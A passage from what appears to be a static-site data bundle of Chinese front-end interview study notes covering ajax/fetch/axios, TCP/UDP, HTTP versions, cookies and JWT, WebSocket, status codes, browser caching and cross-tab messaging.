(xhr.status == 200) {\n                successFn(xhr.responseText)\n            }\n        }\n    }\n    xhr.send(null)\n}\n\n\n\n# fetch\n\nfetch 是一个原生 API ，它和 XMLHttpRequest 一个级别。\n\nfetch 和 XMLHttpRequest 的区别\n\n * 写法更加简洁\n * 原生支持 promise\n\n\n# 面试题：用 fetch 实现一个 ajax\n\nfunction ajax(url) {\n    return fetch(url).then(res => res.json())\n}\n\n\n\n# axios\n\naxios 是一个第三方库，随着 Vue 一起崛起。它和 jquery 一样（jquery 也有 ajax 功能）。\n\naxios 内部可以用 XMLHttpRequest 或者 fetch 实现。',normalizedContent:'# ajax fetch axios 的区别\n\n * ajax 是一种技术称呼，不是具体的 api 和库\n * fetch 是新的异步请求 api ，可代替 xmlhttprequest\n * axios 是第三方库\n\n\n# ajax\n\najax （几个单词首字母，按规范应该大写） - asynchronous javascript and xml（异步的 javascript 和 xml）\n即使用 js 进行异步请求，是 web2.0 的技术基础，从 2005 年左右开始发起。\n所以，这里的 ajax 就是一个称呼，一个缩写。\n\n基于当时 js 规范，异步请求主要使用 xmlhttprequest 这个底层 api 。\n所以，\n\n\n# 面试题：请用 xmlhttprequest 实现 ajax\n\nfunction ajax(url, successfn) {\n    const xhr = new xmlhttprequest()\n    xhr.open("get", url, false)\n    xhr.onreadystatechange = function () {\n        // 这里的函数异步执行，可参考之前 js 基础中的异步模块\n        if (xhr.readystate == 4) {\n            if (xhr.status == 200) {\n                successfn(xhr.responsetext)\n            }\n        }\n    }\n    xhr.send(null)\n}\n\n\n\n# fetch\n\nfetch 是一个原生 api ，它和 xmlhttprequest 一个级别。\n\nfetch 和 xmlhttprequest 的区别\n\n * 写法更加简洁\n * 原生支持 promise\n\n\n# 面试题：用 fetch 实现一个 ajax\n\nfunction ajax(url) {\n    return fetch(url).then(res => res.json())\n}\n\n\n\n# axios\n\naxios 是一个第三方库，随着 vue 一起崛起。它和 jquery 一样（jquery 也有 ajax 功能）。\n\naxios 内部可以用 xmlhttprequest 或者 fetch 实现。',charsets:{cjk:!0}},{title:"TCP和UDP",frontmatter:{title:"TCP和UDP"},regularPath:"/webstudy/HTTP/TCP%E5%92%8CUDP.html",relativePath:"webstudy/HTTP/TCP和UDP.md",key:"v-d45d5bf2",path:"/webstudy/HTTP/TCP%E5%92%8CUDP.html",headers:[{level:3,title:"TCP协议和UDP协议",slug:"tcp协议和udp协议",normalizedTitle:"tcp协议和udp协议",charIndex:14},{level:3,title:"网络协议",slug:"网络协议",normalizedTitle:"网络协议",charIndex:169},{level:3,title:"UDP 的特点",slug:"udp-的特点",normalizedTitle:"udp 的特点",charIndex:238},{level:3,title:"总结",slug:"总结",normalizedTitle:"总结",charIndex:454},{level:2,title:"连环问：http 1.0 1.1 2.0 区别",slug:"连环问-http-1-0-1-1-2-0-区别",normalizedTitle:"连环问：http 1.0 1.1 2.0 区别",charIndex:525}],headersStr:"TCP协议和UDP协议 网络协议 UDP 的特点 总结 连环问：http 1.0 1.1 2.0 区别",content:"# TCP和UDP\n\n\n# TCP协议和UDP协议\n\nTCP 是一种面向有连接的传输层协议，能够对自己提供的连接实施控制。适用于要求可靠传输的应用，例如文件传输。面向字节流，传输慢\n\nUDP 是一种面向无连接的传输层协议，不会对自己提供的连接实施控制。适用于实时应用，例如：IP电话、视频会议、直播等。，以报文的方式传输，效率高\n\n\n# 网络协议\n\n * HTTP 在应用层，直接被程序使用，http1/2基于TCP传输协议\n * TCP 和 UDP 在传输层，底层\n\n\n# UDP 的特点\n\nUDP 是一种无连接的、不可靠的传输层协议。而 TCP 需要连接、断开连接，参考“三次握手、四次挥手”。\n\n不需要连接，所以 UDP 的效率比 TCP 高。\n\n虽然 UDP 从协议层是不稳定的，但随着现代网络硬件环境的提升，也能保证绝大部分情况下的稳定性。所以，UDP 一直处于被发展的趋势。\n\n例如视频会议、语音通话这些允许中段、不完全保证持续连接的场景，又需要较高的传输效率，就很适合 UDP 协议。\n\n\n# 总结\n\n * HTTP 在应用层，而 UDP 和 TCP 在传输层\n * HTTP 是有连接的、可靠的，UDP 是无连接的、不可靠的\n\n\n# 连环问：http 1.0 1.1 2.0 区别\n\nhttp 1.0 最基础的 http 协议\n\nhttp 1.1\n\n * 引入更多的缓存策略，如 cache-control E-tag\n * 长链接，默认开启 Connection: keep-alive ，多次 http 请求减少了 TCP 连接次数\n * 断点续传，状态吗 206\n * 增加新的 method PUT DELETE 等，可以设计 Restful API\n\nhttp2.0\n\n * header 压缩，以减少体积\n * 多路复用，一个 TCP 连接中可以多个 http 并行请求。拼接资源（如雪碧图、多 js 拼接一个）将变的多余\n * 服务器端推送",normalizedContent:"# tcp和udp\n\n\n# tcp协议和udp协议\n\ntcp 是一种面向有连接的传输层协议，能够对自己提供的连接实施控制。适用于要求可靠传输的应用，例如文件传输。面向字节流，传输慢\n\nudp 是一种面向无连接的传输层协议，不会对自己提供的连接实施控制。适用于实时应用，例如：ip电话、视频会议、直播等。，以报文的方式传输，效率高\n\n\n# 网络协议\n\n * http 在应用层，直接被程序使用，http1/2基于tcp传输协议\n * tcp 和 udp 在传输层，底层\n\n\n# udp 的特点\n\nudp 是一种无连接的、不可靠的传输层协议。而 tcp 需要连接、断开连接，参考“三次握手、四次挥手”。\n\n不需要连接，所以 udp 的效率比 tcp 高。\n\n虽然 udp 从协议层是不稳定的，但随着现代网络硬件环境的提升，也能保证绝大部分情况下的稳定性。所以，udp 一直处于被发展的趋势。\n\n例如视频会议、语音通话这些允许中段、不完全保证持续连接的场景，又需要较高的传输效率，就很适合 udp 协议。\n\n\n# 总结\n\n * http 在应用层，而 udp 和 tcp 在传输层\n * http 是有连接的、可靠的，udp 是无连接的、不可靠的\n\n\n# 连环问：http 1.0 1.1 2.0 区别\n\nhttp 1.0 最基础的 http 协议\n\nhttp 1.1\n\n * 引入更多的缓存策略，如 cache-control e-tag\n * 长链接，默认开启 connection: keep-alive ，多次 http 请求减少了 tcp 连接次数\n * 断点续传，状态吗 206\n * 增加新的 method put delete 等，可以设计 restful api\n\nhttp2.0\n\n * header 压缩，以减少体积\n * 多路复用，一个 tcp 连接中可以多个 http 并行请求。拼接资源（如雪碧图、多 js 拼接一个）将变的多余\n * 服务器端推送",charsets:{cjk:!0}},{title:"token和cookie",frontmatter:{title:"token和cookie"},regularPath:"/webstudy/HTTP/token%E5%92%8Ccookie.html",relativePath:"webstudy/HTTP/token和cookie.md",key:"v-5ae5e296",path:"/webstudy/HTTP/token%E5%92%8Ccookie.html",headers:[{level:2,title:"cookie",slug:"cookie",normalizedTitle:"cookie",charIndex:8},{level:3,title:"cookie跨域限制",slug:"cookie跨域限制",normalizedTitle:"cookie跨域限制",charIndex:212},{level:3,title:"浏览器禁用第三方 cookie",slug:"浏览器禁用第三方-cookie",normalizedTitle:"浏览器禁用第三方 cookie",charIndex:473},{level:3,title:"cookie+session登录",slug:"cookie-session登录",normalizedTitle:"cookie+session登录",charIndex:691},{level:2,title:"token认证",slug:"token认证",normalizedTitle:"token认证",charIndex:1007},{level:3,title:"token+localstorage登录",slug:"token-localstorage登录",normalizedTitle:"token+localstorage登录",charIndex:1131},{level:2,title:"cookie和token区别",slug:"cookie和token区别",normalizedTitle:"cookie和token区别",charIndex:1545},{level:2,title:"session和JWT哪个更优",slug:"session和jwt哪个更优",normalizedTitle:"session和jwt哪个更优",charIndex:1728}],headersStr:"cookie cookie跨域限制 浏览器禁用第三方 cookie cookie+session登录 token认证 token+localstorage登录 cookie和token区别 session和JWT哪个更优",content:"# token和cookie\n\n\n# cookie\n\nhttp 请求是无状态的，即每次请求之后都会断开链接。\n所以，\n引入cookie，客户端向同一个域名下发送请求，会携带相同的 cookie，服务器拿到 cookie 进行解析，便能拿到客户端的状态。而服务端可以通过响应头中的Set-Cookie字段来对客户端写入Cookie\n由于每次请求都携带 cookie ，所以 cookie 大小限制 4kb 以内。\n\n\n\n\n# cookie跨域限制\n\n浏览器存储 cookie 是按照域名区分的，在浏览器无法通过 JS document.cookie 获取到其他域名的 cookie\n\n# 解决cookie跨域\n\nhttp 请求传递 cookie 默认有跨域限制。如果想要开启，需要客户端和服务器同时设置允许\n\n * 客户端：使用 fetch 和 XMLHttpRequest 或者 axios 需要配置 withCredentials\n * 服务端：需要配置 header Access-Control-Allow-Credentials\n\n\n# 浏览器禁用第三方 cookie\n\n现代浏览器都开始禁用第三方 cookie （第三方 js 设置 cookie），打击第三方广告，保护用户个人隐私。\n\n例如一个电商网站 A 引用了淘宝广告的 js\n\n * 你访问 A 时，淘宝 js 设置 cookie ，记录下商品信息\n * 你再次访问淘宝时，淘宝即可获取这个 cookie 内容\n * 再和你的个人信息（也在 cookie 里）一起发送到服务端，这样就知道了你看了哪个商品\n\n\n# cookie+session登录\n\n使用 cookie 做登录校验\n\n * 前端输入用户名密码，传给后端\n * 后端验证成功，返回信息给客户端信息时set-cookie，cookie里面有唯一标识该用户的sessionID\n * 接下来所有接口访问，都自动带上 cookie（浏览器的默认行为， http 协议的规定),在服务器验证信息\n\n# 什么是 session ？\n\n * cookie 只存储 userId ，不去暴露用户信息\n * 用户信息存储在 session 中\n * session 就是服务端的一个 hash 表\n * 存储session 就要需要考虑吧内存的问题（基于Redis 存储 Session）\n\n\n# token认证\n\n * cookie是http 协议规范的，而 token 是自定义的，可以用任何方式传输（如 header body query-string 等）\n * token 默认不会在浏览器存储\n * token 没有跨域限制\n\n\n# token+localstorage登录\n\n * 用户登录，后端验证成功，token值到redis，并且返回给客户端token\n * token一般是一串随机的字符(比如UUID)，value一般是用户ID，并且设置一个过期时间\n * token可以存在localstorage或者vuex中\n * 每次请求服务的时候带上token在请求头，\n * 后端接收到token则根据token查一下redis是否存在，\n * 如果存在则表示用户已认证，\n * 如果token不存在则跳到登录界面让用户重新登录，登录成功后返回一个token值给客户端\n\n# JWT(JSON Web Token)\n\n * 前端输入用户名密码，传给后端\n * 后端验证成功，返回一段 token 字符串 - 将用户信息加密之后得到的\n * 前端获取 token 之后，存储下来\n * 以后访问接口，都在 header 中带上这段 token\n\n\n\n\n# cookie和token区别\n\n * cookie 是 http 规范，而 token 是自定义传递；\n * cookie 会默认被浏览器存储，而 token 需要自己存储；\n * cookie 默认有跨域限制，token 默认没有跨域限制；\n * cookie 一般配合 session 使用，token 一般用于 jwt（json web token）\n\n\n# session和JWT哪个更优\n\nSession 优点\n\n * 原理简单，易于学习\n * 用户信息存储在服务端，可以快速封禁某个登录的用户 —— 有这方强需求的人，一定选择 Session\n\nSession 缺点\n\n * 占用服务端内存，有硬件成本\n * 多进程、多服务器时，不好同步 —— 一般使用第三方 redis 存储 ，成本高\n * 跨域传递 cookie ，需要特殊配置\n\nJWT 的优点\n\n * 不占用服务器内存\n * 多进程、多服务器，不受影响\n * 不受跨域限制\n\nJWT 的缺点\n\n * 无法快速封禁登录的用户\n * token 体积一般大于 cookie，会增加请求的数据量\n\n总结：如果没有“快速封禁登录用户”的需求，建议使用 JWT 方式。",normalizedContent:"# token和cookie\n\n\n# cookie\n\nhttp 请求是无状态的，即每次请求之后都会断开链接。\n所以，\n引入cookie，客户端向同一个域名下发送请求，会携带相同的 cookie，服务器拿到 cookie 进行解析，便能拿到客户端的状态。而服务端可以通过响应头中的set-cookie字段来对客户端写入cookie\n由于每次请求都携带 cookie ，所以 cookie 大小限制 4kb 以内。\n\n\n\n\n# cookie跨域限制\n\n浏览器存储 cookie 是按照域名区分的，在浏览器无法通过 js document.cookie 获取到其他域名的 cookie\n\n# 解决cookie跨域\n\nhttp 请求传递 cookie 默认有跨域限制。如果想要开启，需要客户端和服务器同时设置允许\n\n * 客户端：使用 fetch 和 xmlhttprequest 或者 axios 需要配置 withcredentials\n * 服务端：需要配置 header access-control-allow-credentials\n\n\n# 浏览器禁用第三方 cookie\n\n现代浏览器都开始禁用第三方 cookie （第三方 js 设置 cookie），打击第三方广告，保护用户个人隐私。\n\n例如一个电商网站 a 引用了淘宝广告的 js\n\n * 你访问 a 时，淘宝 js 设置 cookie ，记录下商品信息\n * 你再次访问淘宝时，淘宝即可获取这个 cookie 内容\n * 再和你的个人信息（也在 cookie 里）一起发送到服务端，这样就知道了你看了哪个商品\n\n\n# cookie+session登录\n\n使用 cookie 做登录校验\n\n * 前端输入用户名密码，传给后端\n * 后端验证成功，返回信息给客户端信息时set-cookie，cookie里面有唯一标识该用户的sessionid\n * 接下来所有接口访问，都自动带上 cookie（浏览器的默认行为， http 协议的规定),在服务器验证信息\n\n# 什么是 session ？\n\n * cookie 只存储 userid ，不去暴露用户信息\n * 用户信息存储在 session 中\n * session 就是服务端的一个 hash 表\n * 存储session 就要需要考虑吧内存的问题（基于redis 存储 session）\n\n\n# token认证\n\n * cookie是http 协议规范的，而 token 是自定义的，可以用任何方式传输（如 header body query-string 等）\n * token 默认不会在浏览器存储\n * token 没有跨域限制\n\n\n# token+localstorage登录\n\n * 用户登录，后端验证成功，token值到redis，并且返回给客户端token\n * token一般是一串随机的字符(比如uuid)，value一般是用户id，并且设置一个过期时间\n * token可以存在localstorage或者vuex中\n * 每次请求服务的时候带上token在请求头，\n * 后端接收到token则根据token查一下redis是否存在，\n * 如果存在则表示用户已认证，\n * 如果token不存在则跳到登录界面让用户重新登录，登录成功后返回一个token值给客户端\n\n# jwt(json web token)\n\n * 前端输入用户名密码，传给后端\n * 后端验证成功，返回一段 token 字符串 - 将用户信息加密之后得到的\n * 前端获取 token 之后，存储下来\n * 以后访问接口，都在 header 中带上这段 token\n\n\n\n\n# cookie和token区别\n\n * cookie 是 http 规范，而 token 是自定义传递；\n * cookie 会默认被浏览器存储，而 token 需要自己存储；\n * cookie 默认有跨域限制，token 默认没有跨域限制；\n * cookie 一般配合 session 使用，token 一般用于 jwt（json web token）\n\n\n# session和jwt哪个更优\n\nsession 优点\n\n * 原理简单，易于学习\n * 用户信息存储在服务端，可以快速封禁某个登录的用户 —— 有这方强需求的人，一定选择 session\n\nsession 缺点\n\n * 占用服务端内存，有硬件成本\n * 多进程、多服务器时，不好同步 —— 一般使用第三方 redis 存储 ，成本高\n * 跨域传递 cookie ，需要特殊配置\n\njwt 的优点\n\n * 不占用服务器内存\n * 多进程、多服务器，不受影响\n * 不受跨域限制\n\njwt 的缺点\n\n * 无法快速封禁登录的用户\n * token 体积一般大于 cookie，会增加请求的数据量\n\n总结：如果没有“快速封禁登录用户”的需求，建议使用 jwt 方式。",charsets:{cjk:!0}},{title:"webSocket",frontmatter:{title:"webSocket"},regularPath:"/webstudy/HTTP/webSocket.html",relativePath:"webstudy/HTTP/webSocket.md",key:"v-3310d7e8",path:"/webstudy/HTTP/webSocket.html",headers:[{level:3,title:"简介",slug:"简介",normalizedTitle:"简介",charIndex:16},{level:3,title:"webSocket 建立连接",slug:"websocket-建立连接",normalizedTitle:"websocket 建立连接",charIndex:185},{level:3,title:"webSocket 和 http 区别",slug:"websocket-和-http-区别",normalizedTitle:"websocket 和 http 区别",charIndex:261},{level:3,title:"wss",slug:"wss",normalizedTitle:"wss",charIndex:441}],headersStr:"简介 webSocket 建立连接 webSocket 和 http 区别 wss",content:"# webSocket\n\n\n# 简介\n\n * WebSocket是一种在单个TCP连接上进行全双工通信的协议\n * Websocket 通过HTTP/1.1 协议的101状态码进行握手\n * webSocket 和 http 都是应用层，支持端对端的通讯。可以由服务端发起，也可以由客户端发起。\n   \n\n常见的应用场景：消息通知，直播讨论区，聊天室，协同编辑\n\n\n# webSocket 建立连接\n\n会先发起一个 http 请求，根服务端建立连接。连接成功之后再升级为 webSocket 协议，然后再通讯\n\n\n\n\n# webSocket 和 http 区别\n\n * 协议名称不同——websccoket是 ws 和 http是http\n * http 一般只能浏览器发起请求，webSocket 可以双端发起请求\n * webSocket 无跨域限制\n * webSocket 通过 send 和 onmessage 进行通讯，http 通过 req 和 res 通讯\n\n\n# wss\n\nws 可以升级为 wss 协议，像 http 升级到 https 一样，增加 SSL 安全协议。",normalizedContent:"# websocket\n\n\n# 简介\n\n * websocket是一种在单个tcp连接上进行全双工通信的协议\n * websocket 通过http/1.1 协议的101状态码进行握手\n * websocket 和 http 都是应用层，支持端对端的通讯。可以由服务端发起，也可以由客户端发起。\n   \n\n常见的应用场景：消息通知，直播讨论区，聊天室，协同编辑\n\n\n# websocket 建立连接\n\n会先发起一个 http 请求，根服务端建立连接。连接成功之后再升级为 websocket 协议，然后再通讯\n\n\n\n\n# websocket 和 http 区别\n\n * 协议名称不同——websccoket是 ws 和 http是http\n * http 一般只能浏览器发起请求，websocket 可以双端发起请求\n * websocket 无跨域限制\n * websocket 通过 send 和 onmessage 进行通讯，http 通过 req 和 res 通讯\n\n\n# wss\n\nws 可以升级为 wss 协议，像 http 升级到 https 一样，增加 ssl 安全协议。",charsets:{cjk:!0}},{title:"状态码",frontmatter:{title:"状态码"},regularPath:"/webstudy/HTTP/%E7%8A%B6%E6%80%81%E7%A0%81.html",relativePath:"webstudy/HTTP/状态码.md",key:"v-42916c76",path:"/webstudy/HTTP/%E7%8A%B6%E6%80%81%E7%A0%81.html",headers:[{level:3,title:"2XX(Success 成功状态码)",slug:"_2xx-success-成功状态码",normalizedTitle:"2xx(success 成功状态码)",charIndex:10},{level:3,title:"3XX(Redirection 重定向状态码)",slug:"_3xx-redirection-重定向状态码",normalizedTitle:"3xx(redirection 重定向状态码)",charIndex:118},{level:3,title:"4XX(Client Error 客户端错误状态码)",slug:"_4xx-client-error-客户端错误状态码",normalizedTitle:"4xx(client error 客户端错误状态码)",charIndex:385},{level:3,title:"5XX(Server Error 服务器错误状态码)",slug:"_5xx-server-error-服务器错误状态码",normalizedTitle:"5xx(server error 服务器错误状态码)",charIndex:742}],headersStr:"2XX(Success 成功状态码) 3XX(Redirection 重定向状态码) 4XX(Client Error 客户端错误状态码) 5XX(Server Error 服务器错误状态码)",content:"# 状态码\n\n\n# 2XX(Success 成功状态码)\n\n * 200 OK 表明请求已经成功. 默认情况下状态码为200的响应可以被缓存。\n * 204 No Content 表示目前请求成功，但客户端不需要更新其现有页面\n\n\n# 3XX(Redirection 重定向状态码)\n\n * 301 Moved Permanently 永久重定向。说明请求的资源已经被移动到了由 Location 头部指定的 url 上，是固定的不会再改变。搜索引擎会根据该响应修正。\n * 302 Found 临时重定向。重定向状态码表明请求的资源被暂时的移动到了由 Location 头部指定的 URL 上。浏览器会重定向到这个URL，但是搜索引擎不会对该资源的链接进行更新\n * 304 Not Modified 说明无需再次传输请求的内容，也就是说可以使用缓存的内容。\n\n\n# 4XX(Client Error 客户端错误状态码)\n\n * 401 Unauthorized 说明由于缺乏目标资源要求的身份验证凭证，发送的请求未得到满足。\n * 403 Forbidden 指的是服务器端有能力处理该请求，但是拒绝授权访问。进入该状态后，不能再继续进行验证。该访问是永久禁止的，并且与应用逻辑密切相关（例如不正确的密码）\n * 404 Not Found 说明服务器端无法找到所请求的资源。返回该响应的链接通常称为坏链（broken link）或死链（dead link），它们会导向链接出错处理\n * 405 Method Not Allowed 表明服务器禁止了使用当前 HTTP 方法的请求。需要注意的是，GET 与 HEAD 两个方法不得被禁止，当然也不得返回状态码 405。\n\n\n# 5XX(Server Error 服务器错误状态码)\n\n * 500 Internal Server Error 表示所请求的服务器遇到意外的情况并阻止其执行请求。\n * 502 Bad Gateway 表示作为网关或代理角色的服务器，从上游服务器（如tomcat、php-fpm）中接收到的响应是无效的。\n * 503 Service Unavailable 表示服务器尚未处于可以接受请求的状态。通常造成这种情况的原因是由于服务器停机维护或者已超载。",normalizedContent:"# 状态码\n\n\n# 2xx(success 成功状态码)\n\n * 200 ok 表明请求已经成功. 默认情况下状态码为200的响应可以被缓存。\n * 204 no content 表示目前请求成功，但客户端不需要更新其现有页面\n\n\n# 3xx(redirection 重定向状态码)\n\n * 301 moved permanently 永久重定向。说明请求的资源已经被移动到了由 location 头部指定的 url 上，是固定的不会再改变。搜索引擎会根据该响应修正。\n * 302 found 临时重定向。重定向状态码表明请求的资源被暂时的移动到了由 location 头部指定的 url 上。浏览器会重定向到这个url，但是搜索引擎不会对该资源的链接进行更新\n * 304 not modified 说明无需再次传输请求的内容，也就是说可以使用缓存的内容。\n\n\n# 4xx(client error 客户端错误状态码)\n\n * 401 unauthorized 说明由于缺乏目标资源要求的身份验证凭证，发送的请求未得到满足。\n * 403 forbidden 指的是服务器端有能力处理该请求，但是拒绝授权访问。进入该状态后，不能再继续进行验证。该访问是永久禁止的，并且与应用逻辑密切相关（例如不正确的密码）\n * 404 not found 说明服务器端无法找到所请求的资源。返回该响应的链接通常称为坏链（broken link）或死链（dead link），它们会导向链接出错处理\n * 405 method not allowed 表明服务器禁止了使用当前 http 方法的请求。需要注意的是，get 与 head 两个方法不得被禁止，当然也不得返回状态码 405。\n\n\n# 5xx(server error 服务器错误状态码)\n\n * 500 internal server error 表示所请求的服务器遇到意外的情况并阻止其执行请求。\n * 502 bad gateway 表示作为网关或代理角色的服务器，从上游服务器（如tomcat、php-fpm）中接收到的响应是无效的。\n * 503 service unavailable 表示服务器尚未处于可以接受请求的状态。通常造成这种情况的原因是由于服务器停机维护或者已超载。",charsets:{cjk:!0}},{title:"浏览器的缓存机制",frontmatter:{title:"浏览器的缓存机制"},regularPath:"/webstudy/HTTP/%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6.html",relativePath:"webstudy/HTTP/浏览器的缓存机制.md",key:"v-9b6bab4e",path:"/webstudy/HTTP/%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6.html",headers:[{level:2,title:"协商缓存和强缓存",slug:"协商缓存和强缓存",normalizedTitle:"协商缓存和强缓存",charIndex:15},{level:3,title:"强缓存",slug:"强缓存",normalizedTitle:"强缓存",charIndex:20},{level:3,title:"协商缓存",slug:"协商缓存",normalizedTitle:"协商缓存",charIndex:15}],headersStr:"协商缓存和强缓存 强缓存 协商缓存",content:"# 浏览器的缓存机制\n\n\n# 协商缓存和强缓存\n\n\n# 强缓存\n\n浏览器中的缓存作用分为两种情况，一种是需要发送HTTP请求，一种是不需要发送。\n\n首先检查强缓存，这个阶段不需要发送HTTP请求\n\n通过请求头中相应的字段来进行检查，在HTTP/1.0和HTTP/1.1当中，这个字段是不一样的。\n\n * HTTP/1.0时期，使用的是Expires，\n * HTTP/1.1使用的是Cache-Control。\n\n# Expires\n\nExpires即过期时间。存在于服务端返回的响应头中，告诉浏览器在这个过期时间之前可以直接从缓存里面获取数据，无需再次请求。\n\nExpires: Wed, 22 Nov 2019 08:41:00 GMT\n\n\n这里会有一个问题，那就是服务器的时间和浏览器的时间可能并不一致，那服务器返回的这个过期时间可能就是不准确的。因此这种方式很快在后来的HTTP1.1版本中被抛弃了....\n引入Cache-Control\n\n# Cache-Control\n\n和Expires本质的不同在于它并没有采用具体的过期时间点这个方式，而是采用过期时长来控制缓存，对应的字段是max-age\n\nCache-Control:max-age=360 \n//代表这个响应返回后在 3600 秒，也就是一个小时之内可以直接使用缓存\n\n\n其他的属性\n\n * public：客户端和代理服务器都可以缓存。因为一个请求可能要经过不同的代理服务器最后才到达目标服务器，那么结果就是不仅仅浏览器可以缓存数据，中间的任何代理节点都可以进行缓存。\n * private：这种情况就是只有浏览器能缓存了，中间的代理服务器不能缓存。\n * no-cache：跳过当前的强缓存，发送HTTP请求，即直接进入协商缓存阶段。\n * no-atore：非常粗暴，不进行任何形式的缓存。\n * s-maxage：这和max-age长得比较像，但是区别在于s-maxage是针对代理服务器的缓存时间。值得注意的是，当Expires和Cache-Control同时存在的时候，Cache-Control会优先考虑。\n\n还存在一种情况，当资源缓存时间超时了，也就是强缓存失效了，接下来怎么办？\n引入协商缓存\n\n\n# 协商缓存\n\n强缓存失效之后，浏览器在请求头中携带相应的缓存tag来向服务器发请求，由服务器根据这个tag，决定是否使用缓存，这就是协商缓存\n\n * Last-Modified\n * ETag\n\n# Last-Modified（最后修改时间）\n\n1、在浏览器第一次给服务器发送请求后，服务器会在响应头中加上这个字段。\n\n2、浏览器接收到后，如果再次请求，会在请求头中携带If-Modified-Since字段，这个字段的值也就是服务器传来的最后修改时间。\n\n3、服务器拿到请求头中的If-Modified-Since的字段后，其实会和这个服务器中该资源的最后修改时间对比:\n\n4、如果请求头中的这个值小于最后修改时间，说明是时候更新了。返回新的资源，跟常规的HTTP请求响应的流程一样。\n\n5、否则返回304，告诉浏览器直接用缓存。\n\n# ETag\n\n1、ETag 是服务器根据当前文件的内容，给文件生成的唯一标识，只要里面的内容有改动，这个值就会变。服务器通过响应头把这个值给浏览器。\n\n2、浏览器接收到ETag的值，会在下次请求时，将这个值作为If-None-Match这个字段的内容，并放到请求头中，然后发给服务器。\n\n3、服务器接收到If-None-Match后，会跟服务器上该资源的ETag进行比对:\n\n4、如果两者不一样，说明要更新了。返回新的资源，跟常规的HTTP请求响应的流程一样。否则返回304，告诉浏览器直接用缓存。",normalizedContent:"# 浏览器的缓存机制\n\n\n# 协商缓存和强缓存\n\n\n# 强缓存\n\n浏览器中的缓存作用分为两种情况，一种是需要发送http请求，一种是不需要发送。\n\n首先检查强缓存，这个阶段不需要发送http请求\n\n通过请求头中相应的字段来进行检查，在http/1.0和http/1.1当中，这个字段是不一样的。\n\n * http/1.0时期，使用的是expires，\n * http/1.1使用的是cache-control。\n\n# expires\n\nexpires即过期时间。存在于服务端返回的响应头中，告诉浏览器在这个过期时间之前可以直接从缓存里面获取数据，无需再次请求。\n\nexpires: wed, 22 nov 2019 08:41:00 gmt\n\n\n这里会有一个问题，那就是服务器的时间和浏览器的时间可能并不一致，那服务器返回的这个过期时间可能就是不准确的。因此这种方式很快在后来的http1.1版本中被抛弃了....\n引入cache-control\n\n# cache-control\n\n和expires本质的不同在于它并没有采用具体的过期时间点这个方式，而是采用过期时长来控制缓存，对应的字段是max-age\n\ncache-control:max-age=360 \n//代表这个响应返回后在 3600 秒，也就是一个小时之内可以直接使用缓存\n\n\n其他的属性\n\n * public：客户端和代理服务器都可以缓存。因为一个请求可能要经过不同的代理服务器最后才到达目标服务器，那么结果就是不仅仅浏览器可以缓存数据，中间的任何代理节点都可以进行缓存。\n * private：这种情况就是只有浏览器能缓存了，中间的代理服务器不能缓存。\n * no-cache：跳过当前的强缓存，发送http请求，即直接进入协商缓存阶段。\n * no-atore：非常粗暴，不进行任何形式的缓存。\n * s-maxage：这和max-age长得比较像，但是区别在于s-maxage是针对代理服务器的缓存时间。值得注意的是，当expires和cache-control同时存在的时候，cache-control会优先考虑。\n\n还存在一种情况，当资源缓存时间超时了，也就是强缓存失效了，接下来怎么办？\n引入协商缓存\n\n\n# 协商缓存\n\n强缓存失效之后，浏览器在请求头中携带相应的缓存tag来向服务器发请求，由服务器根据这个tag，决定是否使用缓存，这就是协商缓存\n\n * last-modified\n * etag\n\n# last-modified（最后修改时间）\n\n1、在浏览器第一次给服务器发送请求后，服务器会在响应头中加上这个字段。\n\n2、浏览器接收到后，如果再次请求，会在请求头中携带if-modified-since字段，这个字段的值也就是服务器传来的最后修改时间。\n\n3、服务器拿到请求头中的if-modified-since的字段后，其实会和这个服务器中该资源的最后修改时间对比:\n\n4、如果请求头中的这个值小于最后修改时间，说明是时候更新了。返回新的资源，跟常规的http请求响应的流程一样。\n\n5、否则返回304，告诉浏览器直接用缓存。\n\n# etag\n\n1、etag 是服务器根据当前文件的内容，给文件生成的唯一标识，只要里面的内容有改动，这个值就会变。服务器通过响应头把这个值给浏览器。\n\n2、浏览器接收到etag的值，会在下次请求时，将这个值作为if-none-match这个字段的内容，并放到请求头中，然后发给服务器。\n\n3、服务器接收到if-none-match后，会跟服务器上该资源的etag进行比对:\n\n4、如果两者不一样，说明要更新了。返回新的资源，跟常规的http请求响应的流程一样。否则返回304，告诉浏览器直接用缓存。",charsets:{cjk:!0}},{title:"网页多标签通讯",frontmatter:{title:"网页多标签通讯"},regularPath:"/webstudy/HTTP/%E7%BD%91%E9%A1%B5%E5%A4%9A%E6%A0%87%E7%AD%BE%E9%80%9A%E8%AE%AF.html",relativePath:"webstudy/HTTP/网页多标签通讯.md",key:"v-64357012",path:"/webstudy/HTTP/%E7%BD%91%E9%A1%B5%E5%A4%9A%E6%A0%87%E7%AD%BE%E9%80%9A%E8%AE%AF.html",headers:[{level:2,title:"localstorage",slug:"localstorage",normalizedTitle:"localstorage",charIndex:14},{level:2,title:"webSocket",slug:"websocket",normalizedTitle:"websocket",charIndex:448},{level:2,title:"SharedWorker",slug:"sharedworker",normalizedTitle:"sharedworker",charIndex:489},{level:2,title:"iframe",slug:"iframe",normalizedTitle:"iframe",charIndex:512}],headersStr:"localstorage webSocket SharedWorker iframe",content:"# 网页多标签通讯\n\n\n# localstorage\n\n * 必须是同域的 n 个页面\n * 如过数据不变化，则监听不到\n\n<script>\n  //A页面\n  const btn = document.getElementById(\"btn\");\n  btn.addEventListener(\"click\", () => {\n    const info = {\n      name: \"yang\",\n      age: 18,\n    };\n    localStorage.setItem(\"info\", JSON.stringify(info));\n  });\n  //B页面\n  window.addEventListener('storage', (event) => {\n    console.log('event :>> ', event.key);\n    console.log('object :>> ', object);\n  })\n<\/script>\n\n\n\n# webSocket\n\n通过 webSocket 多页面通讯，无跨域限制。\n\n\n# SharedWorker\n\n暂未了解\n\n\n# iframe\n\nwindow.postMessage\n\n// 父页面向 iframe 发送消息\n// 第二个参数可以限制域名，\nwindow.iframe1.contentWindow.postMessage('hello', '*')\n\n// iframe 向父页面发送消息\nwindow.parent.postMessage('world', '*')\n\n\n> event.origin，监听域名是否合法\n\nwindow.addEventListener(\"message\", receiveMessage, false);\n\nfunction receiveMessage(event)\n{\n  // For Chrome, the origin property is in the event.originalEvent\n  // object.\n  // 这里不准确，chrome 没有这个属性\n  // var origin = event.origin || event.originalEvent.origin;\n  var 